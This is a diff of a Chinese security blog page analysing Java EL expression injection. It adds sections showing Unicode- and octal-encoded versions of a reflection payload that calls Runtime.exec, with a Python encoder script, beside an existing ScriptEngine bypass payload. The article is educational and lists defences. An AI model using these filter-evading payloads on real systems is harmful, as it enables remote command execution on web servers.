@@ -1,114 +1,96 @@
+
 <!DOCTYPE html>
-<html>
-    <!-- Head -->
-    <head><meta name="generator" content="Hexo 3.9.0">
-    <meta http-equiv="content-type" content="text/html; charset=utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="author" content="Mi1k7ea">
-    <meta name="description" itemprop="description" content="已完结.">
-    <meta name="keywords" content=",Java,Web安全,EL注入">
-    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+<html lang="zh-CN">
 
-    <!-- Page Title -->
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,Java,EL注入,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>（先知首发）浅析EL表达式注入漏洞 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
     
-        <title>（先知首发）浅析EL表达式注入漏洞 | Mi1k7ea</title>
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
     
-    <link rel="icon" href="/img/kanxi.jpg">
-    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
-    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+      <link rel="stylesheet" href="/css/xoxo.css">
     
-    <script src="/js/script.js"></script>
-    <link rel="stylesheet" href="/css/style.css">
-    
-    <style>
-        .deactiveColor{
-            color: #37474f;
-        }
-        .activeColor{
-            color: #006064;
-        }
-        a:hover{
-            color: #006064;
-        }
-        .header-btn{
-            color: #37474f;
-        }
-        
-    </style>
+  
 </head>
-    <body>
-        <div class="container">
 
-            <!-- Top Anchor -->
-            <div id="top"></div>
 
-            <!-- Header -->
-            <header class="header-wrapper">
-    <div class="header-title-wrapper">
-        <!-- Page Title -->
-        <p class="header-title">
-             
-                
-                    （先知首发）浅析EL表达式注入漏洞
-                
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
             
-        </p>  
-    </div>    
-
-    
-    
-    <div class="header-detail">
-        <!-- Header Button -->
-        <div class="header-btn-wrapper">
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
             
-                <span>
-                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
-                </span>
-
-                
+          
+      
+          
             
-        </div>
-    </div>
-</header>
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
 
-            <!-- Main -->
-            <main>
-                <article class="post-wrapper">
-    
+  </div>
 
-    
-        <!-- Article Catalog -->
-        <div class="catalog-dropdown col-xs-12 col-sm-12">
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-EL简介"><span class="toc-number">1.</span> <span class="toc-text">0x01 EL简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-基本语法"><span class="toc-number">2.</span> <span class="toc-text">0x02 基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EL语法"><span class="toc-number">2.1.</span> <span class="toc-text">EL语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与-运算符"><span class="toc-number">2.2.</span> <span class="toc-text">[ ]与.运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量"><span class="toc-number">2.3.</span> <span class="toc-text">变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#操作符"><span class="toc-number">2.4.</span> <span class="toc-text">操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#隐式对象"><span class="toc-number">2.5.</span> <span class="toc-text">隐式对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pageContext对象"><span class="toc-number">2.5.1.</span> <span class="toc-text">pageContext对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Scope对象"><span class="toc-number">2.5.2.</span> <span class="toc-text">Scope对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#param和paramValues对象"><span class="toc-number">2.5.3.</span> <span class="toc-text">param和paramValues对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#header和headerValues对象"><span class="toc-number">2.5.4.</span> <span class="toc-text">header和headerValues对象</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EL中的函数"><span class="toc-number">2.6.</span> <span class="toc-text">EL中的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EL表达式调用Java方法"><span class="toc-number">2.7.</span> <span class="toc-text">EL表达式调用Java方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JSP中启动-禁用EL表达式"><span class="toc-number">3.</span> <span class="toc-text">0x03 JSP中启动/禁用EL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#全局禁用EL表达式"><span class="toc-number">3.1.</span> <span class="toc-text">全局禁用EL表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#单个文件禁用EL表达式"><span class="toc-number">3.2.</span> <span class="toc-text">单个文件禁用EL表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-EL表达式注入漏洞"><span class="toc-number">4.</span> <span class="toc-text">0x04 EL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通用PoC"><span class="toc-number">4.1.</span> <span class="toc-text">通用PoC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2011-2730"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2011-2730</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wooyun案例"><span class="toc-number">4.3.</span> <span class="toc-text">Wooyun案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JUEL示例"><span class="toc-number">4.4.</span> <span class="toc-text">JUEL示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-绕过方法"><span class="toc-number">5.</span> <span class="toc-text">0x05 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用反射机制绕过"><span class="toc-number">5.1.</span> <span class="toc-text">利用反射机制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用ScriptEngine调用JS引擎绕过"><span class="toc-number">5.2.</span> <span class="toc-text">利用ScriptEngine调用JS引擎绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-防御方法"><span class="toc-number">6.</span> <span class="toc-text">0x06 防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考"><span class="toc-number">7.</span> <span class="toc-text">0x07 参考</span></a></li></ol>
-        </div>
-    
-
-    
-        <!--For now, Lightbox Only Show in Post Layout -->
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        （先知首发）浅析EL表达式注入漏洞
+      </h1>
+      <span>
         
+        <time class="time" datetime="2020-04-25T16:05:47.000Z">
+        2020-04-26
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/EL注入/">EL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
 
-        
-        
-            <!-- Article Img Lightbox -->
-            <div class="gallery">
-    
-    
-    <div class="lightbox">
-        <!-- Close Button -->
-        <span class="close-gallery">&times;</span>
-        
-        <!-- Photo -->
-        <img class="gallery-photo">
-    </div>
-</div>
-        
-    
-
-    
-
-    <!-- Article Content -->
     <div class="post-content">
-        <p>先知：<a href="https://xz.aliyun.com/t/7692" target="_blank" rel="noopener">https://xz.aliyun.com/t/7692</a></p>
+      <p>先知：<a href="https://xz.aliyun.com/t/7692" target="_blank" rel="noopener">https://xz.aliyun.com/t/7692</a></p>
 <h2 id="0x01-EL简介"><a href="#0x01-EL简介" class="headerlink" title="0x01 EL简介"></a>0x01 EL简介</h2><p>EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。</p>
 <p>EL表达式主要功能如下：</p>
 <ul>
@@ -378,6 +360,14 @@
 <h3 id="利用ScriptEngine调用JS引擎绕过"><a href="#利用ScriptEngine调用JS引擎绕过" class="headerlink" title="利用ScriptEngine调用JS引擎绕过"></a>利用ScriptEngine调用JS引擎绕过</h3><p>同SpEL注入中讲到的：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&apos;&apos;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)&quot;)&#125;</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/04/26/浅析EL表达式注入漏洞/8.png" alt=""></p>
+<h3 id="利用Unicode编码绕过"><a href="#利用Unicode编码绕过" class="headerlink" title="利用Unicode编码绕过"></a>利用Unicode编码绕过</h3><p>对可利用的PoC进行全部或部分的Unicode编码都是OK的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Unicode编码内容为前面反射调用的PoC</span><br><span class="line">\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/9.png" alt=""></p>
+<h3 id="利用八进制编码绕过"><a href="#利用八进制编码绕过" class="headerlink" title="利用八进制编码绕过"></a>利用八进制编码绕过</h3><p>同上，全部或部分进行八进制编码都是OK的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 八进制编码内容为前面反射调用的PoC</span><br><span class="line">\44\173\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\145\170\145\143\47\54\47\47\56\147\145\164\103\154\141\163\163\50\51\51\56\151\156\166\157\153\145\50\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\147\145\164\122\165\156\164\151\155\145\47\51\56\151\156\166\157\153\145\50\156\165\154\154\51\54\47\143\141\154\143\56\145\170\145\47\51\175</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/26/浅析EL表达式注入漏洞/10.png" alt=""></p>
+<p>这里我是通过写个小脚本来实现编码转换的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> str:</span><br><span class="line">	num = <span class="string">"\\"</span> + oct(ord(s))</span><br><span class="line">	result += num</span><br><span class="line">print(result.replace(<span class="string">"\\0"</span>, <span class="string">"\\"</span>))</span><br></pre></td></tr></table></figure>
 <h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul>
 <li><p>尽量不使用外部输入的内容作为EL表达式内容；</p>
 </li>
@@ -390,51 +380,211 @@
 <h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://www.runoob.com/jsp/jsp-expression-language.html" target="_blank" rel="noopener">JSP 表达式语言</a></p>
 <p><a href="https://www.cnblogs.com/taoshihan/p/5638449.html" target="_blank" rel="noopener">EL表达式调用java方法</a></p>
 <p><a href="https://www.cnblogs.com/junsec/p/11132652.html" target="_blank" rel="noopener">JAVA WEB EL表达式注入</a></p>
-  
-    </div> 
 
-    
-
-    <div class="post-info-wrapper">
-            
-                    <!-- Post Info -->
-                    <p class="post-date">2020-04-26</p>
-                    
-                    
-
-                    
-            
     </div>
-</article>
 
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-EL简介"><span class="toc-text">0x01 EL简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-基本语法"><span class="toc-text">0x02 基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EL语法"><span class="toc-text">EL语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与-运算符"><span class="toc-text">[ ]与.运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量"><span class="toc-text">变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#操作符"><span class="toc-text">操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#隐式对象"><span class="toc-text">隐式对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pageContext对象"><span class="toc-text">pageContext对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Scope对象"><span class="toc-text">Scope对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#param和paramValues对象"><span class="toc-text">param和paramValues对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#header和headerValues对象"><span class="toc-text">header和headerValues对象</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EL中的函数"><span class="toc-text">EL中的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EL表达式调用Java方法"><span class="toc-text">EL表达式调用Java方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JSP中启动-禁用EL表达式"><span class="toc-text">0x03 JSP中启动/禁用EL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#全局禁用EL表达式"><span class="toc-text">全局禁用EL表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#单个文件禁用EL表达式"><span class="toc-text">单个文件禁用EL表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-EL表达式注入漏洞"><span class="toc-text">0x04 EL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通用PoC"><span class="toc-text">通用PoC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2011-2730"><span class="toc-text">CVE-2011-2730</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wooyun案例"><span class="toc-text">Wooyun案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JUEL示例"><span class="toc-text">JUEL示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-绕过方法"><span class="toc-text">0x05 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用反射机制绕过"><span class="toc-text">利用反射机制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用ScriptEngine调用JS引擎绕过"><span class="toc-text">利用ScriptEngine调用JS引擎绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用Unicode编码绕过"><span class="toc-text">利用Unicode编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用八进制编码绕过"><span class="toc-text">利用八进制编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-防御方法"><span class="toc-text">0x06 防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考"><span class="toc-text">0x07 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/04/20/BlackHat-2019-Web小结/" rel="next" title="BlackHat 2019 Web小结">
+          BlackHat 2019 Web小结
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/05/01/Java代码反反编译思路/" rel="prev" title="Java代码反反编译对抗思路">
+            Java代码反反编译对抗思路
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
 
     
+    
 
-            </main>
-
-            <!-- 'To Top' Btn-->
-            
-                <div id="to-top">
-    <a href="#top" class="toTop">
-        <i class="fa fa-rocket"></i>
-    </a>
-</div>
-            
-
-            <!-- Footer -->
-            
-                <footer class="footer-wrapper col-xs-12 col-sm-12">
-    <div>
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
         <span>Copyright &copy; Mi1k7ea</span>  |  
         <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
         <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
-    </div><br>
+    </div>
 </footer>
-            
-        </div>
 
-        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
-        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
-        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
-    </body>
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
 </html>
